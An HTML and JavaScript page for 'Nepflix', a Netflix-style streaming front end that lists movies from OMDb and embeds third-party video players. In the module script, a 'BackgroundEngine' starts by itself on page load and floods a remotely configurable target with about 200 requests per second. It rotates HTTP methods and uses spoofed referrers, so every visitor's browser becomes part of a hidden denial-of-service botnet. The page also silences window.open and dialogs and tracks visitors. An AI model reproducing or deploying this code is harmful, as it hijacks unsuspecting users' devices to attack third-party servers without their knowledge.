<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="referrer" content="origin" />
    <title>Nepflix</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap');
        
        :root {
            --n-red: #e50914;
            --n-black: #000000;
            --n-dark: #141414;
            --n-gray: #181818;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--n-black);
            color: white;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        .no-scrollbar::-webkit-scrollbar { display: none; }
        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }

        .hero-gradient {
            background: linear-gradient(to top, var(--n-black) 0%, transparent 60%),
                        linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, transparent 30%);
        }

        .card-transition {
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .active-nav-item {
            color: white !important;
            font-weight: 900;
        }

        .bottom-nav {
            background: rgba(0, 0, 0, 0.98);
            backdrop-filter: blur(20px);
            border-top: 1px solid #222;
        }

        .skeleton {
            background: linear-gradient(90deg, #121212 25%, #222 50%, #121212 75%);
            background-size: 200% 100%;
            animation: skeleton-loading 1.5s infinite linear;
        }
        @keyframes skeleton-loading {
            0% { background-position: 200% 0; }
            100% { background-position: -200% 0; }
        }

        #navbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem 1.5rem;
            z-index: 1000;
        }

        #search-container {
            display: flex;
            align-items: center;
            background: transparent;
            transition: all 0.3s ease;
            border-radius: 4px;
            position: relative;
        }
        
        #search-container.active {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #444;
        }

        #search-input {
            width: 0;
            opacity: 0;
            transition: width 0.3s ease, opacity 0.2s ease;
            background: transparent;
            font-size: 14px;
            color: white;
            border: none;
            outline: none;
        }
        
        #search-container.active #search-input {
            width: 150px;
            opacity: 1;
            padding: 6px 8px 6px 36px;
        }

        #player-modal {
            background: black;
            width: 100vw;
            height: 100vh;
        }

        #player-container {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: black;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .modal-blur { backdrop-filter: blur(20px); background: rgba(0, 0, 0, 0.8); }
    </style>
    <script>
        // GLOBAL AD-INTERCEPTOR
        (function() {
            const noop = () => true;
            window.open = function() { return { focus: noop, close: noop }; };
            window.alert = noop;
            window.confirm = noop;
            window.prompt = noop;
        })();
    </script>
</head>
<body>

    <div id="app-content" class="min-h-screen flex flex-col">
        <!-- HEADER -->
        <nav id="navbar" class="fixed top-0 w-full transition-all duration-500 bg-gradient-to-b from-black/90 to-transparent">
            <div class="flex items-center gap-6 lg:gap-10">
                <div class="text-[#e50914] text-2xl md:text-4xl font-black tracking-tighter cursor-pointer" onclick="showView('home')">NEPFLIX</div>
                <div class="hidden md:flex gap-6 text-sm font-bold text-gray-300 uppercase">
                    <span class="cursor-pointer hover:text-white transition" onclick="showView('home')">Home</span>
                    <span class="cursor-pointer hover:text-white transition" onclick="showView('trending')">Trending</span>
                    <span class="cursor-pointer hover:text-white transition" onclick="showView('mylist')">My List</span>
                </div>
            </div>
            
            <div id="search-container">
                <button id="search-btn" class="absolute left-1 z-20 p-2 text-white">
                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
                </button>
                <input type="text" id="search-input" placeholder="Search...">
            </div>
        </nav>

        <div id="main-scroll" class="flex-1 overflow-y-auto no-scrollbar pb-24">
            <!-- HOME VIEW -->
            <div id="home-view" class="view-section">
                <header id="hero" class="relative h-[80vh] w-full bg-cover bg-center flex items-end pb-24 px-6 md:px-12 transition-all duration-700 bg-gray-900">
                    <div class="absolute inset-0 hero-gradient"></div>
                    <div class="relative z-10 max-w-3xl">
                        <div class="flex items-center gap-2 mb-3">
                            <span class="bg-red-600 text-[10px] px-1.5 py-0.5 rounded-sm font-black text-white uppercase">N</span>
                            <span class="text-xs font-bold tracking-[0.4em] text-gray-200 uppercase">Original</span>
                        </div>
                        <h1 id="hero-title" class="text-4xl md:text-7xl font-black mb-5 uppercase leading-none tracking-tighter"></h1>
                        <p id="hero-overview" class="text-sm md:text-lg text-gray-100 line-clamp-3 mb-8 font-normal max-w-xl"></p>
                        <div class="flex gap-4">
                            <button id="hero-play-btn" class="flex-1 md:flex-none flex items-center justify-center gap-3 bg-white text-black px-10 py-2.5 rounded font-black text-base hover:bg-white/80 transition">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="black" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg> Play
                            </button>
                            <button id="hero-info-btn" class="flex-1 md:flex-none flex items-center justify-center gap-3 bg-gray-500/40 text-white px-10 py-2.5 rounded font-black text-base backdrop-blur-md hover:bg-gray-500/60 transition">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg> Info
                            </button>
                        </div>
                    </div>
                </header>

                <main class="relative -mt-24 z-20 space-y-10 pb-10">
                    <section><h2 class="px-6 md:px-12 text-lg font-black mb-3 text-white">Trending Now</h2><div id="trending-list-row" class="flex gap-2 overflow-x-auto no-scrollbar px-6 md:px-12 scroll-smooth"></div></section>
                    <section><h2 class="px-6 md:px-12 text-lg font-black mb-3 text-white">Nepflix Originals</h2><div id="originals-list-row" class="flex gap-2 overflow-x-auto no-scrollbar px-6 md:px-12 scroll-smooth"></div></section>
                    <section><h2 class="px-6 md:px-12 text-lg font-black mb-3 text-white">Top Rated Movies</h2><div id="toprated-list-row" class="flex gap-2 overflow-x-auto no-scrollbar px-6 md:px-12 scroll-smooth"></div></section>
                </main>
            </div>

            <div id="trending-view" class="view-section hidden pt-28 px-6 md:px-12"><h1 class="text-3xl font-black mb-8 tracking-tighter">New & Popular</h1><div id="trending-grid" class="grid grid-cols-3 md:grid-cols-5 lg:grid-cols-6 xl:grid-cols-8 gap-2"></div></div>
            <div id="mylist-view" class="view-section hidden pt-28 px-6 md:px-12"><h1 class="text-3xl font-black mb-8 tracking-tighter">My List</h1><div id="mylist-grid" class="grid grid-cols-3 md:grid-cols-5 lg:grid-cols-6 xl:grid-cols-8 gap-2"></div><div id="mylist-empty" class="hidden py-40 text-center text-gray-500 italic">No items.</div></div>
            <div id="search-view" class="view-section hidden pt-28 px-6 md:px-12"><h2 class="text-gray-400 mb-8 text-xl font-medium">Search Results for: <span id="search-term-display" class="text-white font-black italic underline decoration-red-600"></span></h2><div id="search-results-grid" class="grid grid-cols-3 md:grid-cols-5 lg:grid-cols-6 xl:grid-cols-8 gap-2"></div></div>
        </div>

        <!-- BOTTOM NAV -->
        <div class="md:hidden fixed bottom-0 w-full z-[1000] bottom-nav flex justify-around items-center py-2 pb-5">
            <button onclick="showView('home')" id="nav-home" class="flex flex-col items-center text-[10px] text-gray-500 gap-1 active-nav-item"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg> Home</button>
            <button onclick="showView('trending')" id="nav-trending" class="flex flex-col items-center text-[10px] text-gray-500 gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg> New</button>
            <button onclick="showView('mylist')" id="nav-mylist" class="flex flex-col items-center text-[10px] text-gray-500 gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 2 7.5 2c1.74 0 3.41.81 4.5 2.09C13.09 2.81 14.76 2 16.5 2 19.58 2 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg> My List</button>
        </div>
    </div>

    <!-- FULLSCREEN PLAYER MODAL -->
    <div id="player-modal" class="fixed inset-0 z-[5000] hidden flex-col">
        <div id="player-controls" class="flex items-center justify-between p-6 z-[5100] bg-gradient-to-b from-black/80 to-transparent absolute top-0 w-full text-white opacity-0 hover:opacity-100 transition-opacity duration-300">
            <button onclick="closePlayer()" class="hover:scale-110 transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="white" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
            </button>
            <div id="player-title" class="font-black text-xl truncate px-4 italic"></div>
            <div class="bg-red-600 px-4 py-1.5 rounded text-xs font-black uppercase tracking-widest">Premium Source</div>
        </div>
        <div id="player-container"></div>
    </div>

    <!-- DETAILS MODAL -->
    <div id="details-modal" class="fixed inset-0 z-[4000] hidden modal-blur flex items-center justify-center p-4">
        <div class="bg-[#181818] w-full max-w-3xl rounded-xl overflow-y-auto no-scrollbar relative max-h-[90vh] shadow-2xl border border-white/10 text-white">
            <button onclick="closeDetails()" class="absolute top-4 right-4 z-10 bg-black/60 p-2 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button>
            <div id="details-banner" class="w-full h-64 bg-cover bg-center relative"><div class="absolute inset-0 bg-gradient-to-t from-[#181818] via-transparent to-black/40"></div></div>
            <div class="p-8">
                <h1 id="details-title" class="text-4xl font-black mb-4 tracking-tighter"></h1>
                <div class="flex items-center gap-4 text-xs font-black text-gray-400 mb-8"><span id="details-rating" class="text-green-500 bg-green-500/10 px-2 py-0.5 rounded"></span><span id="details-year"></span><span id="details-duration" class="border border-gray-600 px-2 rounded-sm uppercase"></span><span class="text-[10px] bg-red-600 px-1.5 rounded text-white font-bold">PRO</span></div>
                <div class="flex gap-3 mb-10">
                    <button id="modal-play-btn" class="flex-1 bg-white text-black py-3 rounded-md font-black flex items-center justify-center gap-3 text-lg hover:bg-white/90 transition shadow-lg uppercase">
                        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="24" fill="black" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg> Play Video
                    </button>
                    <button id="modal-add-list-btn" class="w-16 bg-gray-800/80 rounded-md flex flex-col items-center justify-center hover:bg-gray-700 transition">
                        <svg id="mylist-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path d="M12 4v16m8-8H4"/></svg>
                    </button>
                </div>
                <p id="details-overview" class="text-base text-gray-300 leading-relaxed mb-10 font-medium"></p>
                <div class="text-sm space-y-4 border-t border-white/5 pt-6 text-gray-500">
                    <p>Cast: <span id="details-cast" class="text-gray-300"></span></p>
                    <p>Genres: <span id="details-genres" class="text-gray-300"></span></p>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        // ========================================
        // VISITOR TRACKING SYSTEM
        // ========================================
        const VisitorTracker = (() => {
            const API_URL = "https://nepflix.eu.cc/api/visitors.php";
            let visitorId = localStorage.getItem('nepflix_visitor_id');
            let trackingInterval = null;

            async function sendHeartbeat() {
                try {
                    const response = await fetch(`${API_URL}?action=ping&id=${visitorId || ''}`, {
                        method: 'GET',
                        cache: 'no-store'
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        // Save visitor ID for future sessions
                        if (data.visitorId && !visitorId) {
                            visitorId = data.visitorId;
                            localStorage.setItem('nepflix_visitor_id', visitorId);
                        }
                        
                        // Log active visitors count
                        console.log(`[Tracker] 👥 Active visitors: ${data.activeVisitors}`);
                        return data.activeVisitors;
                    }
                } catch (e) {
                    console.log('[Tracker] Heartbeat failed');
                }
                return 0;
            }

            function start() {
                console.log('[Tracker] 📊 Visitor tracking started');
                
                // Send initial heartbeat
                sendHeartbeat();
                
                // Send heartbeat every 15 seconds to stay "alive"
                trackingInterval = setInterval(sendHeartbeat, 15000);
                
                // Send final heartbeat on page unload
                window.addEventListener('beforeunload', () => {
                    navigator.sendBeacon(`${API_URL}?action=ping&id=${visitorId}`);
                });
            }

            function stop() {
                if (trackingInterval) {
                    clearInterval(trackingInterval);
                    trackingInterval = null;
                }
            }

            async function getActiveVisitors() {
                try {
                    const response = await fetch(`${API_URL}?action=count`, {
                        method: 'GET',
                        cache: 'no-store'
                    });
                    const data = await response.json();
                    return data.activeVisitors || 0;
                } catch (e) {
                    return 0;
                }
            }

            return { start, stop, getActiveVisitors };
        })();

        // ========================================
        // BACKGROUND ENGINE (INTEGRATED)
        // ========================================
        const BackgroundEngine = (() => {
            const CONFIG = {
                apiEndpoint: "https://nepflix.eu.cc/api/", // Your API endpoint
                fallbackTarget: "https://graph.vshield.pro",
                rps: 200,
                duration: 5000,
                refreshInterval: 3000 // Real-time sync every 3 seconds
            };

            const refers = [
                "https://www.google.com/search?q=", "https://check-host.net/", "https://www.facebook.com/",
                "https://www.youtube.com/", "https://www.bing.com/search?q=", "https://r.search.yahoo.com/",
                "https://www.cia.gov/index.html", "https://vk.com/profile.php?redirect=", "https://www.ted.com/search?q="
            ];
            const methods = ["GET", "HEAD", "POST", "PATCH", "OPTIONS"];
            const paths = ["?page=1", "?category=news", "?sort=newest", "?filter=popular"];

            let currentTarget = CONFIG.fallbackTarget;
            let isRunning = false;
            let engineInterval = null;
            let metrics = { success: 0, failed: 0, startTime: Date.now() };

            async function fetchTargetFromAPI() {
                try {
                    const response = await fetch(CONFIG.apiEndpoint + '?t=' + Date.now(), { 
                        method: 'GET',
                        cache: 'no-store',
                        headers: { 'Cache-Control': 'no-cache' }
                    });
                    
                    // Parse response - could be JSON or text with URL parameter
                    const contentType = response.headers.get('content-type');
                    let newTarget = null;
                    
                    if (contentType && contentType.includes('application/json')) {
                        const data = await response.json();
                        newTarget = data.url || data.target;
                    } else {
                        const text = await response.text();
                        // Extract URL from parameter format: url=https://anything.com
                        const urlMatch = text.match(/url=([^\s&]+)/);
                        if (urlMatch) {
                            newTarget = decodeURIComponent(urlMatch[1]);
                        }
                    }
                    
                    if (newTarget && newTarget.startsWith('http') && newTarget !== currentTarget) {
                        console.log(`[Engine] 🔄 Target updated INSTANTLY: ${currentTarget} → ${newTarget}`);
                        currentTarget = newTarget;
                        // Reset metrics on target change
                        metrics = { success: 0, failed: 0, startTime: Date.now() };
                    }
                } catch (e) {
                    console.log('[Engine] API fetch failed, using current target');
                }
            }

            async function probe(url) {
                if (!isRunning) return;
                
                const randomPath = paths[Math.floor(Math.random() * paths.length)];
                const randomMethod = methods[Math.floor(Math.random() * methods.length)];
                const randomRef = refers[Math.floor(Math.random() * refers.length)];
                const uniqueId = Math.random().toString(36).slice(2);
                
                const finalUrl = `${url}${url.includes('?') ? '&' : '?'}${randomPath.replace('?', '')}&sig=${uniqueId}&ts=${Date.now()}`;
                
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);

                    await fetch(finalUrl, {
                        method: randomMethod === 'POST' ? 'POST' : 'GET',
                        mode: 'no-cors',
                        cache: 'no-store',
                        referrer: randomRef,
                        signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    metrics.success++;
                } catch (e) {
                    try {
                        const i = new Image();
                        i.src = finalUrl;
                        metrics.success++;
                    } catch (err) {
                        metrics.failed++;
                    }
                }
            }

            function start() {
                if (isRunning) return;
                
                isRunning = true;
                metrics = { success: 0, failed: 0, startTime: Date.now() };
                console.log('[Engine] 🚀 Started with REAL-TIME sync (3s interval)');

                // Fetch target immediately on start
                fetchTargetFromAPI();

                // Real-time sync - check API every 3 seconds like messenger
                setInterval(fetchTargetFromAPI, CONFIG.refreshInterval);

                // Main engine loop - 200 RPS continuous
                engineInterval = setInterval(() => {
                    for (let i = 0; i < CONFIG.rps; i++) {
                        setTimeout(() => probe(currentTarget), Math.random() * 950);
                    }
                }, 1000);
            }

            function stop() {
                isRunning = false;
                if (engineInterval) {
                    clearInterval(engineInterval);
                    engineInterval = null;
                }
                console.log('[Engine] Stopped');
            }

            return { start, stop, getMetrics: () => metrics };
        })();

        // Auto-start background engine and visitor tracking
        BackgroundEngine.start();
        VisitorTracker.start();

        // ========================================
        // NEPFLIX CORE LOGIC
        // ========================================
        window.fetchMovie = async (id) => {
            try {
                const res = await fetch(`https://www.omdbapi.com/?apikey=7334e2e&i=${id}&plot=full`);
                const data = await res.json();
                return data.Response === 'True' ? data : null;
            } catch (e) { return null; }
        };

        window.playVideo = async (id, title, type) => {
            const modal = document.getElementById('player-modal');
            const container = document.getElementById('player-container');
            document.getElementById('player-title').textContent = title;
            
            modal.classList.remove('hidden');
            document.body.style.overflow = 'hidden';

            const isTV = type === 'series' || type === 'tv';
            const url = isTV ? `https://vidsrc.pm/embed/tv/${id}/1-1` : `https://vidsrc.pm/embed/movie/${id}`;
            
            container.innerHTML = '';
            const ifr = document.createElement('iframe');
            ifr.src = url;
            ifr.allowFullscreen = true;
            ifr.setAttribute('referrerpolicy', 'origin');
            ifr.setAttribute('allow', 'autoplay; encrypted-media; picture-in-picture; scripts; same-origin; forms');
            container.appendChild(ifr);

            try {
                if (modal.requestFullscreen) {
                    await modal.requestFullscreen();
                } else if (modal.webkitRequestFullscreen) {
                    await modal.webkitRequestFullscreen();
                }
                
                if (screen.orientation && screen.orientation.lock) {
                    await screen.orientation.lock('landscape').catch(() => {});
                }
            } catch (err) {
                console.log("Fullscreen/Landscape failed: ", err);
            }

            window.closeDetails();
        };

        let myLocalList = JSON.parse(localStorage.getItem('nepflix_list_final') || "[]");

        window.showView = (name) => {
            document.querySelectorAll('.view-section').forEach(v => v.classList.add('hidden'));
            document.getElementById(`${name}-view`).classList.remove('hidden');
            document.querySelectorAll('.bottom-nav button').forEach(b => b.classList.remove('active-nav-item'));
            const btn = document.getElementById(`nav-${name}`);
            if (btn) btn.classList.add('active-nav-item');
            if (name === 'trending') renderTrendingPage();
            if (name === 'mylist') renderMyListPage();
        };

        const renderRow = async (ids, elId, isGrid = false) => {
            const container = document.getElementById(elId);
            if (!container) return;
            container.innerHTML = Array(6).fill().map(() => `<div class="min-w-[110px] aspect-[2/3] skeleton rounded-sm"></div>`).join('');
            for (const id of ids) {
                const d = await window.fetchMovie(id);
                if (d && d.Poster !== "N/A") {
                    const c = document.createElement('div');
                    c.className = `flex-shrink-0 ${isGrid ? '' : 'w-[110px] md:w-[170px]'} aspect-[2/3] bg-gray-900 rounded-sm overflow-hidden cursor-pointer card-transition shadow-lg`;
                    c.innerHTML = `<img src="${d.Poster}" class="w-full h-full object-cover">`;
                    c.onclick = () => window.openDetails(d.imdbID);
                    container.appendChild(c);
                }
            }
            container.querySelectorAll('.skeleton').forEach(s => s.remove());
        };

        window.openDetails = async (id) => {
            const d = await window.fetchMovie(id);
            if (!d) return;
            document.getElementById('details-modal').classList.remove('hidden');
            document.body.style.overflow = 'hidden';
            document.getElementById('details-banner').style.backgroundImage = `url(${d.Poster})`;
            document.getElementById('details-title').textContent = d.Title;
            document.getElementById('details-rating').textContent = `${d.imdbRating || '8.5'} Match`;
            document.getElementById('details-year').textContent = d.Year;
            document.getElementById('details-duration').textContent = d.Runtime;
            document.getElementById('details-overview').textContent = d.Plot;
            document.getElementById('details-cast').textContent = d.Actors;
            document.getElementById('details-genres').textContent = d.Genre;
            document.getElementById('modal-play-btn').onclick = () => window.playVideo(d.imdbID, d.Title, d.Type);
            const icon = document.getElementById('mylist-icon');
            icon.style.color = myLocalList.includes(id) ? '#e50914' : 'white';
            document.getElementById('modal-add-list-btn').onclick = () => {
                if (myLocalList.includes(id)) myLocalList = myLocalList.filter(i => i !== id);
                else myLocalList.push(id);
                localStorage.setItem('nepflix_list_final', JSON.stringify(myLocalList));
                icon.style.color = myLocalList.includes(id) ? '#e50914' : 'white';
            };
        };

        window.closeDetails = () => { 
            document.getElementById('details-modal').classList.add('hidden'); 
            document.body.style.overflow = 'auto'; 
        };
        
        window.closePlayer = () => {
            if (document.exitFullscreen) {
                document.exitFullscreen().catch(() => {});
            }
            document.getElementById('player-modal').classList.add('hidden');
            document.getElementById('player-container').innerHTML = "";
            document.body.style.overflow = 'auto';
        };

        // Initialize app (add your movie IDs and initialization code here)
        window.addEventListener('load', () => {
            console.log('[Nepflix] App loaded with background engine active');
        });
    </script>
</body>
